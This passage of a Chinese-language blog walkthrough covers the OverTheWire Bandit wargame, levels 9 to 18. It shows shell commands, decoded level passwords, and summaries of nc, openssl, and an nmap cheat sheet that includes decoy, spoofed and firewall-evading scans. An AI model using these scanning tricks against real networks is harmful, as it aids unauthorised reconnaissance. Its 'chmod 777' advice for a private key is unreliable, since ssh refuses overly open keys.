class="line">data.txt</span><br><span class="line">bandit9@bandit:~$ cat  data.txt |grep =</span><br><span class="line">Binary file (standard input) matches</span><br><span class="line">bandit9@bandit:~$ strings data.txt |grep =</span><br><span class="line">========== the*2i<span class="string">&quot;4</span></span><br><span class="line"><span class="string">=:G e</span></span><br><span class="line"><span class="string">========== password</span></span><br><span class="line"><span class="string">&lt;I=zsGi</span></span><br><span class="line"><span class="string">Z)========== is</span></span><br><span class="line"><span class="string">A=|t&amp;E</span></span><br><span class="line"><span class="string">Zdb=</span></span><br><span class="line"><span class="string">c^ LAh=3G</span></span><br><span class="line"><span class="string">*SF=s</span></span><br><span class="line"><span class="string">&amp;========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h2 id="Level-10➡Level-11"><a href="#Level-10➡Level-11" class="headerlink" title="Level_10➡Level_11"></a>Level_10➡Level_11</h2><h2 id="What’s-base64"><a href="#What’s-base64" class="headerlink" title="What’s base64?"></a><strong>What’s base64?</strong></h2><p><strong>Base64</strong>是一种基于64个可打印字符来表示二进制数据的表示方法。由于<img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/9c986fbdc6c036a937e0647d7a6ec5ad745bccab" alt="{\displaystyle \log _{2}64=6}">，所以每6个比特为一个单元，对应某个可打印字符。3个字节相当于24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。在Base64中的可打印字符包括字母<code>A-Z</code>、<code>a-z</code>、数字<code>0-9</code>，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。一些如<a href="https://zh.wikipedia.org/wiki/Uuencode">uuencode</a>的其他编码方法，和之后<a href="https://zh.wikipedia.org/w/index.php?title=BinHex&amp;action=edit&amp;redlink=1">BinHex</a>的版本使用不同的64字符集来代表6个二进制数字，但是不被称为Base64。</p><p><strong>why base64？</strong></p><p><a href="http://www.ruanyifeng.com/blog/2008/06/base64.html">This_is_why_base64</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit10@bandit:~$ cat data.txt | base64 -d</span><br><span class="line">The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</span><br></pre></td></tr></table></figure><h2 id="Level-11➡Level-12"><a href="#Level-11➡Level-12" class="headerlink" title="Level_11➡Level_12"></a>Level_11➡Level_12</h2><h2 id="ROT13"><a href="#ROT13" class="headerlink" title="ROT13:"></a><strong>ROT13</strong>:</h2><p><a href="https://en.wikipedia.org/wiki/ROT13">I_know_what’s_ROT13</a></p><p><strong>command tr:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tr [选项]… 集合1 [集合2]</span><br><span class="line">选项说明：</span><br><span class="line">-c, -C, –complement 用集合1中的字符串替换，要求字符集为ASCII。</span><br><span class="line">-d, –delete 删除集合1中的字符而不是转换</span><br><span class="line">-s, –squeeze-repeats 删除所有重复出现字符序列，只保留第一个；即将重复出现字符串压缩为一个字符串。</span><br><span class="line">-t, –truncate-set1 先删除第一字符集较第二字符集多出的字符</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit11@bandit:~$ cat data.txt | tr <span class="string">&quot;A-Za-z&quot;</span> <span class="string">&quot;N-ZA-Mn-za-m&quot;</span></span><br><span class="line">The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</span><br></pre></td></tr></table></figure><h2 id="Level-12➡Level-13"><a href="#Level-12➡Level-13" class="headerlink" title="Level_12➡Level_13"></a>Level_12➡Level_13</h2><h2 id="Learn-about-hexdump-amp-xxd-amp-gzip-amp-bzip-amp-tar"><a href="#Learn-about-hexdump-amp-xxd-amp-gzip-amp-bzip-amp-tar" class="headerlink" title="Learn about hexdump&amp;xxd&amp;gzip&amp;bzip&amp;tar:"></a><strong>Learn about hexdump&amp;xxd&amp;gzip&amp;bzip&amp;tar:</strong></h2><p> <strong>Linux hexdump命令</strong>一般用来查看“二进制”文件的十六进制编码，但实际上它能查看任何文件，而不只限于二进制文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump [选项] [文件]...</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-n length 只格式化输入文件的前length个字节。</span><br><span class="line">-C 输出规范的十六进制和ASCII码。</span><br><span class="line">-b 单字节八进制显示。</span><br><span class="line">-c 单字节字符显示。</span><br><span class="line">-d 双字节十进制显示。</span><br><span class="line">-o 双字节八进制显示。</span><br><span class="line">-x 双字节十六进制显示。</span><br><span class="line">-s 从偏移量开始输出。</span><br><span class="line">-e 指定格式字符串，格式字符串包含在一对单引号中，格式字符串形如：<span class="string">&#x27;a/b &quot;format1&quot; &quot;format2&quot;&#x27;</span>。</span><br></pre></td></tr></table></figure><p>  每个格式字符串由三部分组成，每个由空格分隔，第一个形如a/b，b表示对每b个输入字节应用format1格式，a表示对每a个输入字节应用format2格式，一般a&gt;b，且b只能为1，2，4，另外a可以省略，省略则a=1。format1和format2中可以使用类似printf的格式字符串，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%02d：两位十进制</span><br><span class="line">%03x：三位十六进制</span><br><span class="line">%02o：两位八进制</span><br><span class="line">%c：单个字符等</span><br></pre></td></tr></table></figure><p> 还有一些特殊的用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%_ad：标记下一个输出字节的序号，用十进制表示。</span><br><span class="line">%_ax：标记下一个输出字节的序号，用十六进制表示。</span><br><span class="line">%_ao：标记下一个输出字节的序号，用八进制表示。</span><br><span class="line">%_p：对不能以常规字符显示的用 . 代替。</span><br></pre></td></tr></table></figure><p> 同一行如果要显示多个格式字符串，则可以跟多个<code>-e</code>选项。</p><p>Demo:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexdump -e <span class="string">&#x27;16/1 &quot;%02X &quot; &quot;  |  &quot;&#x27;</span> -e <span class="string">&#x27;16/1 &quot;%_p&quot; &quot;\n&quot;&#x27;</span> <span class="built_in">test</span></span><br><span class="line">00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  |  ................  </span><br><span class="line">10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F  |  ................  </span><br><span class="line">20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F  |   !<span class="string">&quot;#$%&amp;&#x27;()*+,-./ </span></span><br></pre></td></tr></table></figure><p><strong>xxd</strong></p><p>xxd是二进制查看命令，默认将2文件显示为16进制字符串表示形式。</p><p>Usage:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd [options] [infile  [outfile]]</span><br></pre></td></tr></table></figure><p>  or</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -r [-s [-]offset] [-c cols] [-ps] [infile  [outfile]]</span><br></pre></td></tr></table></figure><p>options:</p><pre><code>-a          缺省忽略转换: 使用‘*’替换空行.-b          二进数数据转储 (与 -ps,-i,-r不兼容). 默认为16进制.-c cols    每行多少列octets（特制8比特的字节）. 默认为16列(-i: 12, -ps: 30).-E          使用EBCDIC字符集. 默认为ASCII字符集.-e          小端模式转储 (与 -ps,-i,-r不兼容).-g          在正常输出中，每组八位字节数. 默认为2个 (-e: 4).-h          输出此帮助.-i          使用C语言文件样式输出.-r          reverse operation: convert (or patch) hexdump into binary.</code></pre><p><strong>bzip2、gzip：</strong></p><p>解压压缩命令</p><p>Options：</p><p>-d ：解压</p><p>-k：保留源文件</p><p><strong>tar:</strong></p><p> <strong>tar</strong>可以为linux的文件和目录创建档案。利用tar，可以为某一特定文件创建档案（备份文件），也可以在档案中改变文件，或者向档案中加入新的文件。tar最初被用来在磁带上创建档案，现在，用户可以在任何设备上创建档案。利用tar命令，可以把一大堆的文件和目录全部打包成一个文件，这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。</p><p> 首先要弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件；压缩则是将一个大的文件通过一些压缩算法变成一个小文件。</p><p> 为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar(选项)(参数)</span><br></pre></td></tr></table></figure><p><strong>options</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">-A或--catenate：新增文件到以存在的备份文件；</span><br><span class="line">-B：设置区块大小；</span><br><span class="line">-c或--create：建立新的备份文件；</span><br><span class="line">-C &lt;目录&gt;：这个选项用在解压缩，若要在特定目录解压缩，可以使用这个选项。</span><br><span class="line">-d：记录文件的差别；</span><br><span class="line">-x或--extract或--get：从备份文件中还原文件；</span><br><span class="line">-t或--list：列出备份文件的内容；</span><br><span class="line">-z或--gzip或--ungzip：通过gzip指令处理备份文件；</span><br><span class="line">-Z或--compress或--uncompress：通过compress指令处理备份文件；</span><br><span class="line">-f&lt;备份文件&gt;或--file=&lt;备份文件&gt;：指定备份文件；</span><br><span class="line">-v或--verbose：显示指令执行过程；</span><br><span class="line">-r：添加文件到已经压缩的文件；</span><br><span class="line">-u：添加改变了和现有的文件到已经存在的压缩文件；</span><br><span class="line">-j：支持bzip2解压文件；</span><br><span class="line">-v：显示操作过程；</span><br><span class="line">-l：文件系统边界设置；</span><br><span class="line">-k：保留原有文件不覆盖；</span><br><span class="line">-m：保留文件不被覆盖；</span><br><span class="line">-w：确认压缩文件的正确性；</span><br><span class="line">-p或--same-permissions：用原来的文件权限还原文件；</span><br><span class="line">-P或--absolute-names：文件名使用绝对名称，不移除文件名称前的“/”号；</span><br><span class="line">-N &lt;日期格式&gt; 或 --newer=&lt;日期时间&gt;：只将较指定日期更新的文件保存到备份文件里；</span><br><span class="line">--exclude=&lt;范本样式&gt;：排除符合范本样式的文件。</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bandit12@bandit:~$ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x  2 root     root     4096 May  7  2020 .</span><br><span class="line">drwxr-xr-x 41 root     root     4096 May  7  2020 ..</span><br><span class="line">-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout</span><br><span class="line">-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc</span><br><span class="line">-rw-r-----  1 bandit13 bandit12 2582 May  7  2020 data.txt</span><br><span class="line">-rw-r--r--  1 root     root      675 May 15  2017 .profile</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看data.txt文件后发现是二进制文件hexdump后的文件，但是该目录下我们并没有权限对该文件进行xxd操作</p><p>ls -al / root查看root目录下tmp文件我们具有权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">bandit12@bandit:~$ mkdir /tmp/what_a_fuck</span><br><span class="line">bandit12@bandit:~$ cp data.txt /tmp/what_a_fuck/data.txt</span><br><span class="line">bandit12@bandit:~$ <span class="built_in">cd</span> /tmp/what_a_fuck</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ xxd -r data.txt &gt;data.bin</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ ls</span><br><span class="line">data.bin  data.txt</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file data.bin</span><br><span class="line">data.bin: gzip compressed data, was <span class="string">&quot;data2.bin&quot;</span>, last modified: Thu May  7 18:14:30 2020, max compression, from Unix</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ mv data.bin data.gz</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ gzip -d data.gz </span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ ls</span><br><span class="line">data  data.txt</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file data</span><br><span class="line">data: bzip2 compressed data, block size = 900k</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ mv data data.bz2</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ bzip2 -d data.bz2 </span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ ls</span><br><span class="line">data  data.txt</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file data</span><br><span class="line">data: gzip compressed data, was <span class="string">&quot;data4.bin&quot;</span>, last modified: Thu May  7 18:14:30 2020, max compression, from Unix</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ mv data data.gz</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ gzip -d data.gz </span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ ls</span><br><span class="line">data  data.txt</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file data</span><br><span class="line">data: POSIX tar archive (GNU)</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ tar -xvf data</span><br><span class="line">data5.bin</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file data5.bin </span><br><span class="line">data5.bin: POSIX tar archive (GNU)</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ tar -xvf  data5.bin </span><br><span class="line">data6.bin</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file data6.bin </span><br><span class="line">data6.bin: bzip2 compressed data, block size = 900k</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ mv data6.bin fuck.bz2</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ bzip2 -d fuck.bz2 </span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ ls</span><br><span class="line">data  data5.bin  data.txt  fuck</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file fuck</span><br><span class="line">fuck: POSIX tar archive (GNU)</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ tar -xvf fuck</span><br><span class="line">data8.bin</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file data8.bin </span><br><span class="line">data8.bin: gzip compressed data, was <span class="string">&quot;data9.bin&quot;</span>, last modified: Thu May  7 18:14:30 2020, max compression, from Unix</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ mv data8.bin shit.gz</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ gzip -d shit.gz </span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file shit</span><br><span class="line">shit: ASCII text</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ cat shit </span><br><span class="line">The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Level-13➡Level-14"><a href="#Level-13➡Level-14" class="headerlink" title="Level_13➡Level_14"></a>Level_13➡Level_14</h2><p>用所给密钥登录bandit14账号连接到主机即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bandit13@bandit:~$ ls</span><br><span class="line">sshkey.private</span><br><span class="line">bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost</span><br><span class="line">bandit14@bandit:/etc$ <span class="built_in">cd</span> /etc/bandit_pass</span><br><span class="line">bandit14@bandit:/etc/bandit_pass$ cat bandit14</span><br><span class="line">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span><br></pre></td></tr></table></figure><h2 id="Level-14➡Level-15"><a href="#Level-14➡Level-15" class="headerlink" title="Level_14➡Level_15"></a>Level_14➡Level_15</h2><p>Man is a good command 🙂</p><h2 id="Learn-about-nc"><a href="#Learn-about-nc" class="headerlink" title="Learn about nc"></a><strong>Learn about nc</strong></h2><p>NAME<br>     nc — arbitrary TCP and UDP connections and listens</p><p>SYNOPSIS<br>     nc [-46bCDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length]<br>        [-P proxy_username] [-p source_port] [-q seconds] [-s source] [-T keyword] [-V rtable]<br>        [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]]<br>        [-Z peercertfile] [destination] [port]</p><p>DESCRIPTION<br>     The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP,<br>     or UNIX-domain sockets.  It can open TCP connections, send UDP packets, listen on arbitrary<br>     TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6.  Unlike telnet(1), nc<br>     scripts nicely, and separates error messages onto standard error instead of sending them to<br>     standard output, as telnet(1) does with some.</p><p>Most used options</p><ul><li>-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个;</li><li>-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数;</li><li>-h：在线帮助;</li><li>-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口;</li><li>-l：使用监听模式，监控传入的资料;</li><li>-n：直接使用ip地址，而不通过域名服务器;</li><li>-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存;</li><li>-p&lt;通信端口&gt;：设置本地主机使用的通信端口;</li><li>-r：指定源端口和目的端口都进行随机的选择;</li><li>-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址;</li><li>-u：使用UDP传输协议;</li><li>-v：显示指令执行过程;</li><li>-w&lt;超时秒数&gt;：设置等待连线的时间;</li><li>-z：使用0输入/输出模式，只在扫描通信端口时使用。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit14@bandit:~$ nc localhost 30000</span><br><span class="line">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span><br><span class="line">Correct!</span><br><span class="line">BfMYroe26WYalil77FoDi9qh59eK5xNr</span><br></pre></td></tr></table></figure><h2 id="Level-15➡Level-16"><a href="#Level-15➡Level-16" class="headerlink" title="Level_15➡Level_16"></a>Level_15➡Level_16</h2><h2 id="Learn-about-openssl、s-client"><a href="#Learn-about-openssl、s-client" class="headerlink" title="Learn about openssl、s_client"></a><strong>Learn about openssl、s_client</strong></h2><pre><code>   The s_client command implements a generic SSL/TLS client which connects to a remote host   using SSL/TLS. It is a very useful diagnostic tool for SSL servers.</code></pre><p>man文档写的很详细。</p><p>直接连就行</p><p><em>openssl s_client -connect localhost:30001</em></p><p>输入本关flag即可</p><h2 id="Level-16➡Level-17"><a href="#Level-16➡Level-17" class="headerlink" title="Level_16➡Level_17"></a>Level_16➡Level_17</h2><h2 id="What’s-nmap"><a href="#What’s-nmap" class="headerlink" title="What’s nmap?"></a><strong>What’s nmap?</strong></h2><p><strong>Name</strong></p><p>nmap - Network exploration tool and security / port scanner</p><p> <strong>Synopsis</strong></p><p><strong>nmap</strong> [<em>Scan Type</em>…] [<em>Options</em>] {<em>target specification</em>}</p><p><strong>Options</strong></p><div class="table-container"><table><thead><tr><th>-sT</th><th>TCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。</th></tr></thead><tbody><tr><td>-sS</td><td>半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。</td></tr><tr><td>-sF  -sN</td><td>秘密FIN数据包扫描、Xmas Tree、Null扫描模式</td></tr><tr><td>-sP</td><td>ping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。</td></tr><tr><td>-sU</td><td>UDP扫描，但UDP扫描是不可靠的</td></tr><tr><td>-sA</td><td>这项高级的扫描方法通常用来穿过防火墙的规则集</td></tr><tr><td>-sV</td><td>探测端口服务版本</td></tr><tr><td>-Pn</td><td>扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描</td></tr><tr><td>-v</td><td>显示扫描过程，推荐使用</td></tr><tr><td>-h</td><td>帮助选项，是最清楚的帮助文档</td></tr><tr><td>-p</td><td>指定端口，如“1-65535、1433、135、22、80”等</td></tr><tr><td>-O</td><td>启用远程操作系统检测，存在误报</td></tr><tr><td>-A</td><td>全面系统检测、启用脚本检测、扫描等</td></tr><tr><td>-oN/-oX/-oG</td><td>将报告写入文件，分别是正常、XML、grepable 三种格式</td></tr><tr><td>-T4</td><td>针对TCP端口禁止动态扫描延迟超过10ms</td></tr><tr><td>-iL</td><td>读取主机列表，例如，“-iL C:\ip.txt”</td></tr></tbody></table></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">nmap常用参数 </span><br><span class="line">nmap -A IP 最常规的nmap扫描</span><br><span class="line">nmap -sP IP 简单扫描（simple Ping）</span><br><span class="line">nmap -sS IP 用SYN进行扫描，会向目标发一个小的包</span><br><span class="line">nmap -sT IP 用TCP进行扫描，会向目标发一个小的包</span><br><span class="line">nmap -sU IP 用UDP进行扫描，会向目标发一个小的包</span><br><span class="line">nmap -sI IP1 IP2 用伪装的IP1地址去扫描目标IP2</span><br><span class="line">   </span><br><span class="line">nmap IP  ;   nmap -PE IP 常规的基于ICMP ping扫描</span><br><span class="line">nmap -PP IP 使用ICMP时间戳扫描，可以透墙</span><br><span class="line">nmap -PN IP IP如看似离线、宕机，尝试此参数，不用ICMP PING来进行扫描</span><br><span class="line">nmap -PS IP 使用TCP SYN 扫描，不用ICMP</span><br><span class="line">nmap -PA IP 使用TCP ACK 扫描，不用ICMP</span><br><span class="line">nmap -PU IP 使用UDP 扫描，不用ICMP</span><br><span class="line">nmap -p 端口号 IP 扫描某IP的某端口</span><br><span class="line">nmap -O IP 扫描目的IP设备，系统检测查看OS等信息</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">nmap -sU -sT -p U:53,T:25 172.20.6.69 扫描172.20.6.69  的tcp25口，udp的53口</span><br><span class="line">nmap –source-port  54 172.20.6.69 用指定的端口（如54）去扫描目标IP（172.20.6.69）</span><br><span class="line">nmap –data-length  25  172.20.6.69 发指定长度的包去探测目标IP</span><br><span class="line">nmap –randomize-hosts 172.20.6.69-100 随机遍历扫描172.20.6.69-100之间的IP</span><br><span class="line">   </span><br><span class="line">nmap -D RND:10 172.20.6.69 —D 诱饵选项，设定n个随机虚假的地址去扫描目标地址172.20.6.69</span><br><span class="line">nmap -d 172.20.6.69 debug模式扫描目标IP,可以看到每一步的进度</span><br><span class="line">nmap –mtu 8  172.20.6.69 设置mtu为8 ，发很小的包给172.20.6.69进行扫描，能避免大多数的防火墙的阻拦，此值只要是8的倍数就行，如16，32,40.。。。</span><br><span class="line">nmap -F IP 快速扫描目标IP端口，也发送很小的包给目标地址，有点类似上条  –mtu 8</span><br><span class="line">   </span><br><span class="line">nmap -oN  scan.txt 172.20.6.1/24 扫描172.20.6.0网段设备，结果输出至文件sanc.txt中</span><br><span class="line">nmap -oX  scan.xml 172.20.6.1/24 扫描172.20.6.0网段设备，结果输出至文件sanc.xml中</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV localhost -p 31000-32000</span><br></pre></td></tr></table></figure><p>扫出来的几个端口不多一个个试即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof</span><br></pre></td></tr></table></figure><p>输入本关密码即可得到下一关的密钥</p><h2 id="Level-17➡Level-18"><a href="#Level-17➡Level-18" class="headerlink" title="Level_17➡Level_18"></a>Level_17➡Level_18</h2><p>用上一关private_key进行连接的时候注意一点，要用chmod改一下私钥权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 rsa.priv</span><br></pre></td></tr></table></figure><h2 id="Usage-of-diff"><a href="#Usage-of-diff" class="headerlink" title="Usage of diff"></a><strong>Usage of diff</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bandit17@bandit:~$ ls</span><br><span class="line">passwords.new  passwords.old</span><br><span class="line">bandit17@bandit:~$ diff passwords.old passwords.new</span><br><span class="line">42c42</span><br><span class="line">&lt; w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii</span><br><span class="line">---</span><br><span class="line">&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</span><br></pre></td></tr></table></figure><h2 id="Level-18➡Level-19"><a href="#Level-18➡Level-19" class="headerlink" title="Level_18➡Level_19"></a>Level_18➡Level_19</h2><p>连接到ssh后没有伪终端界面，但是我们依旧可以执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ssh -p2220 bandit18@bandit.labs.overthewire.org ls -al</span><br><span class="line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line"></span><br><span class="line">bandit18@bandit.labs.overthewire.org<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">total 24</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root     root     4096 May  7  2020 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 41 root     root     4096 May  7  2020 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout</span></span><br><span class="line"><span class="string">-rw-r-----  1 bandit19 bandit18 3549 May  7  2020 .bashrc</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root     root      675 May 15  2017 .profile</span></span><br><span class="line"><span class="string">-rw-r-----  1 bandit19 bandit18   33 May  7  2020 